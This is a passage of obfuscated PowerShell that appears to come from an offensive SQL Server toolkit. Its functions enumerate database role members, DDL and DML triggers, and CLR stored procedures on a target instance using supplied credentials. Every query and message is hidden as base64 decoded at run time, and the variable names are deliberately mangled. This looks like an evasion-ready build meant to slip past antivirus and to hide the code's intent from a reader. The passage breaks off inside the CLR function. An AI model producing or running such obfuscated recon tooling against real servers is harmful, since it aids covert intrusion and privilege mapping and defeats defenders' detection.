            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ACcAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAAgAGEAcwAgAFsAUgBvAGwAZQBQAHIAaQBuAGMAaQBwAGEAbABJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAaQBkACAAYQBzACAAWwBSAG8AbABlAFAAcgBpAG4AYwBpAHAAYQBsAFMAaQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABuAGEAbQBlACAAYQBzACAAWwBSAG8AbABlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAeQBwAGUAXwBkAGUAcwBjACAAYQBzACAAWwBSAG8AbABlAFAAcgBpAG4AYwBpAHAAYQBsAFQAeQBwAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AdwBuAGkAbgBnAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAIABhAHMAIABbAE8AdwBuAGUAcgBQAHIAaQBuAGMAaQBwAGEAbABJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdQBzAGUAcgBfAG4AYQBtAGUAKABvAHcAbgBpAG4AZwBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABhAHMAIABbAE8AdwBuAGUAcgBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAHMAXwBmAGkAeABlAGQAXwByAG8AbABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBvAGQAaQBmAHkAXwBEAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZABlAGYAYQB1AGwAdABfAHMAYwBoAGUAbQBhAF8AbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQAuAFsAcwB5AHMAXQAuAFsAZABhAHQAYQBiAGEAcwBlAF8AcAByAGkAbgBjAGkAcABhAGwAcwBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAFIARQAgAHQAeQBwAGUAIABsAGkAawBlACAAJwBSACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8AXwAvAFwAXwBfAC8APQA9AD0APQBcAF8AXwAvAD0APQB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AFwALwBcAC8AXAAvAD0APQBcAC8APQA9AD0AXAAvAH0A')))
            ${_/\/=\____/=\_/=\} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${_/\/=\____/=\_/=\} |
            % -Process {
                ${/=\/======\___/=\} = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
                if (${/=\/======\___/=\}.length -le 10)
                {
                    ${_/\/\/=\_/=\/\__/} = [Convert]::ToInt32(${/=\/======\___/=\},16)
                }
                else
                {
                    ${_/\/\/=\_/=\/\__/} = ${/=\/======\___/=\}
                }
                $null = ${_/\/\/=\___/\__/=}.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.RolePrincipalId,
                    ${_/\/\/=\_/=\/\__/},
                    $_.RolePrincipalName,
                    [string]$_.RolePrincipalType,
                    [string]$_.OwnerPrincipalId,
                    [string]$_.OwnerPrincipalName,
                    [string]$_.is_fixed_role,
                    $_.create_date,
                    $_.modify_Date,
                [string]$_.default_schema_name)
            }
        }
    }
    End
    {
        ${_/\/\/=\___/\__/=}
    }
}
Function  Get-SQLDatabaseRoleMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\_/\_/\_/=\___/} = New-Object -TypeName System.Data.DataTable
        if ($PrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFUAUwBFAFIAXwBOAEEATQBFACgAbQBlAG0AYgBlAHIAXwBwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAApACAAbABpAGsAZQAgACcAJABQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlACcA')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
        if ($RolePrincipalName)
        {
            ${__/\__/====\__/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFUAUwBFAFIAXwBOAEEATQBFACgAcgBvAGwAZQBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABsAGkAawBlACAAJwAkAFIAbwBsAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${__/\__/====\__/==} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -NoDefaults -SuppressVerbose
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwBlAHQAdABpAG4AZwAgAHIAbwBsAGUAIABtAGUAbQBiAGUAcgBzACAAZgBvAHIAIAB0AGgAZQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAgAGQAYQB0AGEAYgBhAHMAZQAuAC4ALgA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ACcAIABhAHMAIABbAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAG8AbABlAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAIABhAHMAIABbAFIAbwBsAGUAUAByAGkAbgBjAGkAcABhAGwASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABVAFMARQBSAF8ATgBBAE0ARQAoAHIAbwBsAGUAXwBwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAApACAAYQBzACAAWwBSAG8AbABlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG0AZQBtAGIAZQByAF8AcAByAGkAbgBjAGkAcABhAGwAXwBpAGQAIABhAHMAIABbAFAAcgBpAG4AYwBpAHAAYQBsAEkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVQBTAEUAUgBfAE4AQQBNAEUAKABtAGUAbQBiAGUAcgBfAHAAcgBpAG4AYwBpAHAAYQBsAF8AaQBkACkAIABhAHMAIABbAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQAuAFsAcwB5AHMAXQAuAFsAZABhAHQAYQBiAGEAcwBlAF8AcgBvAGwAZQBfAG0AZQBtAGIAZQByAHMAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBSAEUAIAAxAD0AMQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAC8AXABfAF8ALwA9AD0APQA9AFwAXwBfAC8APQA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8ALwA9AFwALwBcAC8APQA9AD0AXABfAF8ALwBcAC8AfQA=')))
            ${/\________/=\___/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${_/\_/\_/\_/=\___/} = ${_/\_/\_/\_/=\___/} + ${/\________/=\___/}
        }
    }
    End
    {
        ${_/\_/\_/\_/=\___/}
    }
}
Function  Get-SQLTriggerDdl
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${__/\/\___/\/=====} = New-Object -TypeName System.Data.DataTable
        if ($TriggerName)
        {
            ${_____/==\_/\_/==\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFQAcgBpAGcAZwBlAHIATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${_____/==\_/\_/==\} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABTAEUATABFAEMAVAAgAAkAJwAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACcAIABhAHMAIABbAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAEkAbgBzAHQAYQBuAGMAZQAnACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABuAGEAbQBlACAAYQBzACAAWwBUAHIAaQBnAGcAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABvAGIAagBlAGMAdABfAGkAZAAgAGEAcwAgAFsAVAByAGkAZwBnAGUAcgBJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAFQAcgBpAGcAZwBlAHIAVAB5AHAAZQBdACAAPQAgACcAUwBFAFIAVgBFAFIAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHkAcABlAF8AZABlAHMAYwAgAGEAcwAgAFsATwBiAGoAZQBjAHQAVAB5AHAAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAYQByAGUAbgB0AF8AYwBsAGEAcwBzAF8AZABlAHMAYwAgAGEAcwAgAFsATwBiAGoAZQBjAHQAQwBsAGEAcwBzAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBCAEoARQBDAFQAXwBEAEUARgBJAE4ASQBUAEkATwBOACgATwBCAEoARQBDAFQAXwBJAEQAKQAgAGEAcwAgAFsAVAByAGkAZwBnAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG0AbwBkAGkAZgB5AF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAHMAXwBtAHMAXwBzAGgAaQBwAHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAcwBfAGQAaQBzAGEAYgBsAGUAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAbQBhAHMAdABlAHIAXQAuAFsAcwB5AHMAXQAuAFsAcwBlAHIAdgBlAHIAXwB0AHIAaQBnAGcAZQByAHMAXQAgAFcASABFAFIARQAgADEAPQAxAA0ACgAgACAAIAAgACAAIAAgACAAJAB7AF8AXwBfAF8AXwAvAD0APQBcAF8ALwBcAF8ALwA9AD0AXAB9AA==')))
        ${/=\/===\/\____/==} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${__/\/\___/\/=====} = ${__/\/\___/\/=====}  + ${/=\/===\/\____/==}
    }
    End
    {
        ${__/\/\___/\/=====}
    }
}
Function  Get-SQLTriggerDml
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${___/\/\/====\/\/\} = New-Object -TypeName System.Data.DataTable
        if ($TriggerName)
        {
            ${_____/==\_/\_/==\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFQAcgBpAGcAZwBlAHIATgBhAG0AZQAnAA==')))
        }
        else
        {
            ${_____/==\_/\_/==\} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAARABNAEwAIAB0AHIAaQBnAGcAZQByAHMAIABmAHIAbwBtACAAdABoAGUAIABkAGEAdABhAGIAYQBzAGUAcwAgAGIAZQBsAG8AdwA6AC4A')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQA=')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAHUAcwBlACAAWwAkAHsALwA9AD0APQA9AFwALwA9AFwAXwAvAD0APQBcAF8AXwAvAH0AXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAXwBfAC8AfQAnACAAQQBTACAAWwBEAGEAdABhAGIAYQBzAGUATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBDAEgARQBNAEEAXwBOAEEATQBFACgAbwAuAHMAYwBoAGUAbQBhAF8AaQBkACkAIABBAFMAIABbAFMAYwBoAGUAbQBhAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBuAGEAbQBlACAAQQBTACAAWwBUAHIAaQBnAGcAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBvAGIAagBlAGMAdABfAGkAZAAgAEEAUwAgAFsAVAByAGkAZwBnAGUAcgBJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAVAByAGkAZwBnAGUAcgBUAHkAcABlAF0AIAA9ACAAJwBEAEEAVABBAEIAQQBTAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgB0AHkAcABlAF8AZABlAHMAYwAgAEEAUwAgAFsATwBiAGoAZQBjAHQAVAB5AHAAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAHAAYQByAGUAbgB0AF8AYwBsAGEAcwBzAF8AZABlAHMAYwAgAEEAUwAgAFsATwBiAGoAZQBjAHQAQwBsAGEAcwBzAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAEIASgBFAEMAVABfAEQARQBGAEkATgBJAFQASQBPAE4AKAB0AC4AbwBiAGoAZQBjAHQAXwBpAGQAKQAgAEEAUwAgAFsAVAByAGkAZwBnAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AC4AYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAG0AbwBkAGkAZgB5AF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBpAHMAXwBtAHMAXwBzAGgAaQBwAHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAGkAcwBfAGQAaQBzAGEAYgBsAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQALgBpAHMAXwBuAG8AdABfAGYAbwByAF8AcgBlAHAAbABpAGMAYQB0AGkAbwBuACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAAuAGkAcwBfAGkAbgBzAHQAZQBhAGQAXwBvAGYAXwB0AHIAaQBnAGcAZQByAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBzAHkAcwBdAC4AWwB0AHIAaQBnAGcAZQByAHMAXQAgAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAHMAeQBzAF0ALgBbAG8AYgBqAGUAYwB0AHMAXQAgAG8AIABPAE4AIAB0AC4AcABhAHIAZQBuAHQAXwBpAGQAIAA9ACAAbwAuAG8AYgBqAGUAYwB0AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBSAEUAIAAxAD0AMQAgACQAewBfAF8AXwBfAF8ALwA9AD0AXABfAC8AXABfAC8APQA9AFwAfQA=')))
            ${/=\_/\____/=\__/=} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${___/\/\/====\/\/\} = ${___/\/\/====\/\/\} + ${/=\_/\____/=\__/=}
        }
    }
    End
    {
        ${___/\/\/====\/\/\}
    }
}
Function  Get-SQLStoredProcedureCLR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$AssemblyName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$ExportFolder,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Show native CLR as well.')]
        [Switch]$ShowAll,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/==\_____/==\_/\/} = New-Object -TypeName System.Data.DataTable
